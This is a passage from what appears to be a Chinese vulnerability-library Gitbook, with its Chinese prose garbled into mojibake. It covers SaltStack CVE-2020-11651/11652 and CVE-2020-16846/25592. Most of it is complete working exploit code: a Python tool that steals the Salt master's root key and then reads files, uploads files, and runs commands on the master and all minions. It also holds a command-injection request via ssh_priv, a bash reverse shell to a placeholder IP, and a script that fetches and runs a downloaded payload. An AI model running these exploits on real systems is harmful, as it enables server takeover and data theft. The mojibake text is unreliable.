ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-11651/11652","keywords":"","body":"Saltstack ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-11651/11652 ÊºèÊ¥ûÊèèËø∞ SaltStack ÊòØÂü∫‰∫é Python ÂºÄÂèëÁöÑ‰∏ÄÂ•óC/SÊû∂ÊûÑÈÖçÁΩÆÁÆ°ÁêÜÂ∑•ÂÖ∑„ÄÇÂõΩÂ§ñÊüêÂÆâÂÖ®Âõ¢ÈòüÊä´Èú≤‰∫Ü SaltStack Â≠òÂú®ËÆ§ËØÅÁªïËøáÊºèÊ¥ûÔºàCVE-2020-11651ÔºâÂíåÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºàCVE-2020-11652Ôºâ„ÄÇ Âú® CVE-2020-11651 ËÆ§ËØÅÁªïËøáÊºèÊ¥û‰∏≠ÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÂèØ‰ª•ÁªïËøá Salt Master ÁöÑÈ™åËØÅÈÄªËæëÔºåË∞ÉÁî®Áõ∏ÂÖ≥Êú™ÊéàÊùÉÂáΩÊï∞ÂäüËÉΩÔºå‰ªéËÄåÂèØ‰ª•ÈÄ†ÊàêËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û„ÄÇ Âú® CVE-2020-11652 ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û‰∏≠ÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèËØ∑Ê±ÇÔºåÂèØ‰ª•ËØªÂèñ„ÄÅÂÜôÂÖ•ÊúçÂä°Âô®‰∏ä‰ªªÊÑèÊñá‰ª∂„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] SaltStack Version SaltStack Version ÁéØÂ¢ÉÊê≠Âª∫ [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-11652 docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ salt-masterÊôÆÈÅç‰ΩøÁî®Ëøô‰∏§Ë°å‰ª£Á†ÅËøõË°åËÆ§ËØÅÔºåÂÖ∂‰∏≠clear_loadÊòØÂèØÊéßËæìÂÖ•ÁÇπ„ÄÇ auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load) auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key) _prep_auth_infoÈ¶ñÂÖà‰ºöËØÜÂà´clear_loadËæìÂÖ•ÁöÑÂ≠óÊÆµÂπ∂ÈÄâÁî®ÂÖ∂‰∏≠‰πã‰∏Ä‰Ωú‰∏∫ËÆ§ËØÅÊñπÂºèÔºåÁÑ∂Âêé‰º†ÂèÇÂà∞check_authenticationÊñπÊ≥ïÊ£ÄÈ™åËÆ§ËØÅÊòØÂê¶ÊúâÊïà„ÄÇ Âú®Á¨¨‰∏âÁßçËÆ§ËØÅÊñπÂºèauth_type=='user'‰∏≠Ôºå‰ºöÁî±_prep_auth_infoËé∑ÂèñÂà∞Á≥ªÁªüoptÁöÑkeyÔºå‰º†ÈÄíÂà∞check_authentication‰∏≠ÂíåAPIÂèÇÊï∞‰∏≠Êê∫Â∏¶ÁöÑkeyËøõË°å==ÊØîÂØπ„ÄÇ ÁêÜËÆ∫‰∏ä_prep_auth_infoÊòØ‰∏çÂèØË¢´Â§ñÈÉ®Ë∞ÉÁî®ÁöÑÔºåÊºèÊ¥ûÊàêÂõ†Âç≥ÊòØÊîªÂáªËÄÖÈÄöËøáÂåøÂêçAPIÁõ¥Êé•Ë∞ÉÁî®_prep_auth_infoÊñπÊ≥ïÔºåÂú®ÂõûÊòæ‰∏≠ÊãøÂà∞self.keyÔºåÂπ∂Âú®ÂêéÁª≠ÁöÑËØ∑Ê±Ç‰∏≠‰ΩøÁî®Ëé∑ÂèñÂà∞ÁöÑkeyËøáÈ™åËØÅÔºå‰ª•rootÊùÉÈôêÊâßË°åÈ´òÂç±Êåá‰ª§„ÄÇ Mworker daemonËøõÁ®ãÂ§ÑÁêÜAPIËØ∑Ê±ÇÔºö class MWorker(salt.utils.process.SignalHandlingProcess): \"\"\" The worker multiprocess instance to manage the backend operations for the salt master. \"\"\" ÂÖ∂‰∏≠ _handle_clear & _handle_aes ÂáΩÊï∞ÂàÜÂà´Â§ÑÁêÜÊòéÊñáÂíåÂä†ÂØÜÊåá‰ª§Ôºö Âú®ËøôÈáåÔºåself._clear_funcs ÊòØ class ClearFuncs ÁöÑÂÆû‰æãÔºåÂú®ËøôÈáåAPIËÆøÈóÆËÄÖÂèØ‰ª•Êó†ËÆ§ËØÅË∞ÉÁî®‰ªªÊÑèÁöÑÁ±ªÂáΩÊï∞„ÄÇ class ClearFuncs(TransportMethods): \"\"\" Set up functions that are safe to execute when commands sent to the master without encryption and authentication \"\"\" ClearFuncs._prep_auth_info()Â∞Üself.keyËøîÂõûÁªôAPIÈÄ†ÊàêÊ≥ÑÈú≤„ÄÇÊîªÂáªËÄÖÂèØÂÖàÈÄöËøáËøô‰∏ÄÊñπÊ≥ïÊãøÂà∞keyÔºåÁÑ∂ÂêéÈÄöËøáËÆ§ËØÅÊé•Âè£‰∏ãÂèëshellÊåá‰ª§„ÄÇ ‰πãÂâçÂ≠òÂú®ÊºèÊ¥ûÁöÑ‰ª£Á†Å‰∏≠‰ªÖËøáÊª§Êéâ__ÂºÄÂ§¥ÁöÑprivateÊñπÊ≥ïÔºåÂØºËá¥_prep_auth_infoÊ≥ÑÈú≤Ôºåpatch‰∏≠ÂØπclearfuncsÂíåaesfuncs‰∏§‰∏™Á±ªÊ∑ªÂä†‰∫ÜexposeÁôΩÂêçÂçïËøáÊª§Ôºö ËøôÈáå‰ΩøÁî® POC Êù•Â§çÁ∫ø ‰∏ãËΩΩÂú∞ÂùÄ: https://github.com/jasperla/CVE-2020-11651-poc ËØªÂèñÊñá‰ª∂ /etc/passwd ÂèçÂºπshellÔºàËøôÈáå‰ΩøÁî®Âè¶‰∏Ä‰∏™POCÔºâ ‰∏ãËΩΩÂú∞ÂùÄ: https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py ÊºèÊ¥ûÂà©Áî®POC ‰∏ãËΩΩÂú∞ÂùÄ # BASE https://github.com/bravery9/SaltStack-Exp # ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÔºöÂè∞‰∏ãË®Ä‰π¶ # -*- coding:utf-8 -*- - from __future__ import absolute_import, print_function, unicode_literals import argparse import os import sys import datetime import salt import salt.version import salt.transport.client import salt.exceptions DEBUG = False def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') def check_salt_version(): print(\"[+] Salt ÁâàÊú¨: {}\".format(salt.version.__version__)) vi = salt.version.__version_info__ if (vi ‰∏ãËΩΩÂú∞ÂùÄ #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc) # This exploit is based on this checker script: # https://github.com/rossengeorgiev/salt-security-backports from __future__ import absolute_import, print_function, unicode_literals import argparse import datetime import os import os.path import sys import time import salt import salt.version import salt.transport.client import salt.exceptions def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') # --- check funcs ---- def check_connection(master_ip, master_port, channel): print(\"[+] Checking salt-master ({}:{}) status... \".format(master_ip, master_port), end='') sys.stdout.flush() # connection check try: channel.send({'cmd':'ping'}, timeout=2) except salt.exceptions.SaltReqTimeoutError: print(\"OFFLINE\") sys.exit(1) else: print(\"ONLINE\") def check_CVE_2020_11651(channel): print(\"[+] Checking if vulnerable to CVE-2020-11651... \", end='') sys.stdout.flush() try: rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3) except: print('ERROR') return None else: pass finally: if rets: print('YES') root_key = rets[2]['root'] return root_key print('NO') return None def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path): print(\"[+] Checking if vulnerable to CVE-2020-11652 (read_token)... \", end='') sys.stdout.flush() # try read file msg = { 'cmd': 'get_token', 'arg': [], 'token': top_secret_file_path, } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"YES\") except: print(\"ERROR\") raise else: if debug: print() print(rets) print(\"NO\") def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (read)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': top_secret_file_path, 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) if rets['data']['return']: print(\"YES\") else: print(\"NO\") def check_CVE_2020_11652_write1(debug, channel, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (write1)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'path': '../../../../../../../../tmp/salt_CVE_2020_11652', 'data': 'evil', 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) pp(rets) if rets['data']['return'].startswith('Wrote'): try: os.remove('/tmp/salt_CVE_2020_11652') except OSError: print(\"Maybe?\") else: print(\"YES\") else: print(\"NO\") def check_CVE_2020_11652_write2(debug, channel, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (write2)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'config.update_config', 'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652', 'yaml_contents': 'evil', 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) if rets['data']['return'].startswith('Wrote'): try: os.remove('/tmp/salt_CVE_2020_11652.conf') except OSError: print(\"Maybe?\") else: print(\"YES\") else: print(\"NO\") def pwn_read_file(channel, root_key, path, master_ip): print(\"[+] Attemping to read {} from {}\".format(path, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': path, 'saltenv': 'base', } rets = channel.send(msg, timeout=3) print(rets['data']['return'][0][path]) def pwn_upload_file(channel, root_key, src, dest, master_ip): print(\"[+] Attemping to upload {} to {} on {}\".format(src, dest, master_ip)) sys.stdout.flush() try: fh = open(src, 'rb') payload = fh.read() fh.close() except Exception as e: print('[-] Failed to read {}: {}'.format(src, e)) return msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'saltenv': 'base', 'data': payload, 'path': dest, } rets = channel.send(msg, timeout=3) print('[ ] {}'.format(rets['data']['return'])) def pwn_exec(channel, root_key, cmd, master_ip, jid): print(\"[+] Attemping to execute {} on {}\".format(cmd, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'runner', 'fun': 'salt.cmd', 'saltenv': 'base', 'user': 'sudo_user', 'kwarg': { 'fun': 'cmd.exec_code', 'lang': 'python', 'code': \"import subprocess;subprocess.call('{}',shell=True)\".format(cmd) }, 'jid': jid, } try: rets = channel.send(msg, timeout=3) except Exception as e: print('[-] Failed to submit job') return if rets.get('jid'): print('[+] Successfully scheduled job: {}'.format(rets['jid'])) def pwn_exec_all(channel, root_key, cmd, master_ip, jid): print(\"[+] Attemping to execute '{}' on all minions connected to {}\".format(cmd, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': '_send_pub', 'fun': 'cmd.run', 'user': 'root', 'arg': [ \"/bin/sh -c '{}'\".format(cmd) ], 'tgt': '*', 'tgt_type': 'glob', 'ret': '', 'jid': jid } try: rets = channel.send(msg, timeout=3) except Exception as e: print('[-] Failed to submit job') return finally: if rets == None: print('[+] Successfully submitted job to all minions.') else: print('[-] Failed to submit job') def main(): parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652') parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1') parser.add_argument('--port', '-p', dest='master_port', default='4506') parser.add_argument('--force', '-f', dest='force', default=False, action='store_false') parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true') parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true') parser.add_argument('--read', '-r', dest='read_file') parser.add_argument('--upload-src', dest='upload_src') parser.add_argument('--upload-dest', dest='upload_dest') parser.add_argument('--exec', dest='exec', help='Run a command on the master') parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions') args = parser.parse_args() print(\"[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.\") time.sleep(1) # Both src and destination are required for uploads if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None): print('[-] Must provide both --upload-src and --upload-dest') sys.exit(1) channel = init_minion(args.master_ip, args.master_port) check_connection(args.master_ip, args.master_port, channel) root_key = check_CVE_2020_11651(channel) if root_key: print('[*] root key obtained: {}'.format(root_key)) else: print('[-] Failed to find root key...aborting') sys.exit(127) if args.run_checks: # Assuming this check runs on the master itself, create a file with \"secret\" content # and abuse CVE-2020-11652 to read it. top_secret_file_path = '/tmp/salt_cve_teta' with salt.utils.fopen(top_secret_file_path, 'w') as fd: fd.write(\"top secret\") # Again, this assumes we're running this check on the master itself with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd: root_key = keyfd.read() check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path) check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key) check_CVE_2020_11652_write1(debug, channel, root_key) check_CVE_2020_11652_write2(debug, channel, root_key) os.remove(top_secret_file_path) sys.exit(0) if args.read_file: pwn_read_file(channel, root_key, args.read_file, args.master_ip) if args.upload_src: if os.path.isabs(args.upload_dest): print('[-] Destination path must be relative; aborting') sys.exit(1) pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip) jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow()) if args.exec: pwn_exec(channel, root_key, args.exec, args.master_ip, jid) if args.exec_all: print(\"[!] Lester, is this what you want? Hit ^C to abort.\") time.sleep(2) pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid) if __name__ == '__main__': main() ÂèÇËÄÉÊñáÁ´† https://www.cdxy.me/?p=822 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Saltstack/SaltStack Êú™ÊéàÊùÉËÆøÈóÆÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-16846 25592.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/Saltstack/SaltStack Êú™ÊéàÊùÉËÆøÈóÆÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-16846 25592.html","title":"SaltStack Êú™ÊéàÊùÉËÆøÈóÆÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-16846/25592","keywords":"","body":"SaltStack Êú™ÊéàÊùÉËÆøÈóÆÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2020-16846/25592 ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥11Êúà4Êó•ÔºåSaltStack ÂÆòÊñπÂèëÂ∏É‰∫Ü‰∏ÄÂàôÂÆâÂÖ®Êõ¥Êñ∞ÂÖ¨ÂëäÔºåÂÖ∂‰∏≠CVE-2020-16846ÂíåCVE-2020-25592ÁªÑÂêà‰ΩøÁî®ÂèØÂú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãÈÄöËøásalt-apiÊé•Âè£ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇCVE-2020-25592ÂÖÅËÆ∏‰ªªÊÑèÁî®Êà∑Ë∞ÉÁî®SSHÊ®°ÂùóÔºåCVE-2020-16846ÂÖÅËÆ∏Áî®Êà∑ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇsalt-apiËôΩ‰∏çÊòØÈªòËÆ§ÂºÄÂêØÈÖçÁΩÆÔºå‰ΩÜÁªùÂ§ßÂ§öÊï∞SaltStackÁî®Êà∑‰ºöÈÄâÊã©ÂºÄÂêØsalt-apiÔºåÊïÖÂ≠òÂú®ËæÉÈ´òÈ£éÈô©„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] SaltStack Version 3002 SaltStack Version 3001.1, 3001.2 SaltStack Version 3000.3, 3000.4 SaltStack Version 2019.2.5, 2019.2.6 SaltStack Version 2018.3.5 SaltStack Version 2017.7.4, 2017.7.8 SaltStack Version 2016.11.3, 2016.11.6,2016.11.10 SaltStack Version 2016.3.4, 2016.3.6,2016.3.8 SaltStack Version 2015.8.10, 2015.8.13 ÁéØÂ¢ÉÊê≠Âª∫ [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-16846 docker-compose up -d ÊºèÊ¥ûÂ§çÁé∞ salt-api RESTÊé•Âè£ÈªòËÆ§‰ΩøÁî®cherrypyÊ°ÜÊû∂Ôºå‰ªérunÊé•Âè£ÁöÑÂÆûÁé∞‰∏äÂèØ‰ª•ÁúãÂá∫ÈÄöËøáclientÂèÇÊï∞Âä®ÊÄÅË∞ÉÁî®NetapiClientÁ±ª‰∏≠ÁöÑÊñπÊ≥ï„ÄÇ Êñá‰∏≠ÊåáÂÆö‰ª£Á†Å‰ΩçÁΩÆÈááÁî®‰ª•‰∏ãÁ∫¶ÂÆö FileLocation:Classname.method() salt/netapi/init.py:NetapiClient.run() lowÂèÇÊï∞‰∏∫Â§ñÈÉ®‰º†ÂÖ•ÂèÇÊï∞Ôºåsalt.utils.args.format_callÊñπÊ≥ïÂ∞ÜÂèÇÊï∞ËµãÂÄºÁªôkwargs„ÄÇ ÂΩìclientÂèÇÊï∞‰∏∫sshÊó∂ÔºåÂä®ÊÄÅË∞ÉÁî®salt/netapi/init.py:NetapiClient.ssh(), ËØ•ÊñπÊ≥ïÊú™ÈááÁî®‰ªª‰ΩïÈâ¥ÊùÉ„ÄÇ salt/netapi/init.py:NetapiClient.ssh() Ë∑üËøõÔºåË∑ØÂæÑÂ¶Ç‰∏ãÔºö salt/netapi/init.py:NetapiClient.ssh()‚áísalt/client/ssh/client.py:SSHClient.cmd_sync()‚áísalt/client/ssh/client.py:SSHClient._prep_ssh() salt/client/ssh/client.py:SSHClient._prep_ssh() ËØ•ÊñπÊ≥ïÂ∞ÜkwargsÂ§ñÈÉ®ÂèØÊéßÂèÇÊï∞Êõ¥Êñ∞ÂÄºoptsÂèòÈáèÔºåËØ•ÂèòÈáèÂèØ‰ª•ÁêÜËß£‰∏∫SaltStackÁ≥ªÁªüÁöÑÁéØÂ¢ÉÂèòÈáèÔºå‰ΩøÁî®ËØ•ÂèòÈáèÂàùÂßãÂåñsalt.client.ssh.SSH„ÄÇ salt/client/ssh/init.py:SSH.init() privÁöÑÂÄº‰ªéoptsÂèòÈáè‰∏≠Ëé∑ÂèñÔºåÂπ∂Ë∞ÉÁî®salt.client.ssh.shell.gen_key()ÊñπÊ≥ï„ÄÇ salt/client/ssh/shell.py:gen_key() POCËØ∑Ê±ÇÂåÖ‰∏∫ POST /run HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 109 token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|wget http://xxx.dnslog.cn ÂèçÂºπshellÁöÑÊñπÊ≥ï ÂÖàÂÜô bashÊñá‰ª∂ÔºåÂÜÖÂÆπ‰∏∫ÂèçÂºπshellËØ≠Âè•Ôºå‰ΩøÁî®wget‰∏ãËΩΩÂà∞ÁõÆÊ†á‰∏≠ [!NOTE] !/bin/sh bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 ÁõëÂê¨Á´ØÂè£Ôºå‰ΩøÁî® /bin/bash ËøêË°åÊñá‰ª∂ ÂèçÂºπshell ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POCÁõÆÂΩï‰∏≠ peiqi.shÊñá‰ª∂ ÈúÄË¶ÅÊõ¥ÊîπÂèçÂºπip,port,Âπ∂‰∏ä‰º†Âà∞ÊúçÂä°Âô®ËÆ©ÁõÆÊ†áËøõË°å‰∏ãËΩΩ DNSÊúâÂìçÂ∫îÂàô‰ª£Ë°®ÂèØËÉΩÊúâÊºèÊ¥ûÔºå‰æøÂèØ‰ª•ËøõË°åÂèçÂºπshell import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: SaltStack Version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.cn \\033[0m') print('+ \\033[36mFile_addr >>> http://xxx.xxx.xxx/cmd.sh \\033[0m') print('+ \\033[36mFile_name >>> cmd.sh \\033[0m') print('+------------------------------------------') def POC_1(target_url, dnslog): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget http://{}\".format(dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°å wget http://{} \\033[0m\".format(dnslog)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ËØ∑Êü•Áúã DnslogÂìçÂ∫î \\033[0m\") while True: Chois = input(\"\\033[35mÊòØÂê¶ÂèçÂºπ Shell(Y/N) >>> \\033[0m\") if Chois == \"Y\" or Chois == \"y\": File_addr = input(\"\\033[35mFile_addr >>> \\033[0m\") File_name = input(\"\\033[35mFile_name >>> \\033[0m\") POC_2(target_url, File_addr, File_name) else: sys.exit(0) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, File_addr, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget {}\".format(File_addr) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°å wget {} \\033[0m\".format(File_addr)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäü‰∏ãËΩΩ{} \\033[0m\".format(File_addr)) POC_3(target_url, File_name) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|/bin/bash {}\".format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] Ê≠£Âú®ÊâßË°å /bin/bash \\033[0m\".format(File_name)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÂëΩ‰ª§ÊâßË°åÂÆåÊØïÔºåËØ∑Êü•ÁúãÊòØÂê¶ÂèçÂºπShell \\033[0m\".format(File_name)) sys.exit(0) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[32m[o] ÂëΩ‰ª§ÊâßË°åÊàêÂäü \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, dnslog) ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/MinIO/":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/MinIO/","title":"MinIO","keywords":"","body":"MinIO MinIO SSRFÊºèÊ¥û CVE-2021-21287 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/MinIO/MinIO SSRFÊºèÊ¥û CVE-2021-21287.html":{"url":"book/ÊúçÂä°Âô®Â∫îÁî®ÊºèÊ¥û/MinIO/MinIO SSRFÊºèÊ¥û CVE-2021-21287.html","title":"MinIO SSRFÊºèÊ¥û CVE-2021-21287","keywords":"","body":"MinIO SSRFÊºèÊ¥û CVE-2021-21287 ÊºèÊ¥ûÊèèËø∞ ÈöèÁùÄÂ∑•‰ΩúÂíåÁîüÊ¥ª‰∏≠ÁöÑ‰∏Ä‰∫õÁéØÂ¢ÉÈÄêÊ∏êÂæÄ‰∫ëÁ´ØËøÅÁßªÔºåÂØπË±°Â≠òÂÇ®ÁöÑÈúÄÊ±Ç‰πüÈÄêÊ∏êÂ§ö‰∫ÜËµ∑Êù•ÔºåMinIOÂ∞±ÊòØ‰∏ÄÊ¨æÊîØÊåÅÈÉ®ÁΩ≤Âú®ÁßÅÊúâ‰∫ëÁöÑÂºÄÊ∫êÂØπË±°Â≠òÂÇ®Á≥ªÁªü„ÄÇMinIOÂÆåÂÖ®ÂÖºÂÆπAWS S3ÁöÑÂçèËÆÆÔºå‰πüÊîØÊåÅ‰Ωú‰∏∫S3ÁöÑÁΩëÂÖ≥ÔºåÊâÄ‰ª•Âú®ÂÖ®ÁêÉË¢´ÂπøÊ≥õ‰ΩøÁî®ÔºåÂú®Github‰∏äÂ∑≤Êúâ25kÊòüÊòü„ÄÇMinIO‰∏≠Â≠òÂú®SSRFÊºèÊ¥ûÔºåÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØÊàñËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] MinIO ÊºèÊ¥ûÂ§çÁé∞ 